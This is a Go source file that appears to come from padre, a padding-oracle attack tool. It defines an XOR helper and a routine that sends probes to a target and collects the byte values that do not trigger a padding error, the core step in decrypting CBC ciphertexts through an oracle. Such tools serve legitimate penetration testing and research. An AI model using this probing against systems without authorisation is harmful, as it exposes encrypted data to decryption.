package exploit

import (
	"context"

	"github.com/glebarez/padre/pkg/client"
)

// XORs 2 slices of bytes
func xorSlices(s1 []byte, s2 []byte) []byte {
	if len(s1) != len(s2) {
		panic("lengths of slices not equal")
	}

	output := make([]byte, len(s1))

	for i := 0; i < len(s1); i++ {
		output[i] = s1[i] ^ s2[i]
	}

	return output
}

// detect bytes that do not produce padding error
// early-stop when maxCount of such bytes reached
func (p *Padre) getErrorlessByteValues(chunk []byte, pos int, maxCount int) ([]byte, error) {
	// the context 	will be cancelled upon returning from function
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// container for bytes that do not produce padding error
	goodBytes := make([]byte, 0, maxCount)

	chanResult := make(chan *client.ProbeResult, 256)

	// do probing
	p.client.SendProbes(ctx, chunk, pos, chanResult)

	// process result
	for result := range chanResult {
		if result.Err != nil {
			return nil, result.Err
		}

		// test for padding error
		isErr, err := p.matcher.IsPaddingError(result.Response)
		if err != nil {
			return nil, err
		}

		// collect the right bytes
		if !isErr {
			goodBytes = append(goodBytes, result.Byte)
			// early exit of maxCount reached
			if len(goodBytes) == maxCount {
				break
			}
		}
	}

	return goodBytes, nil
}
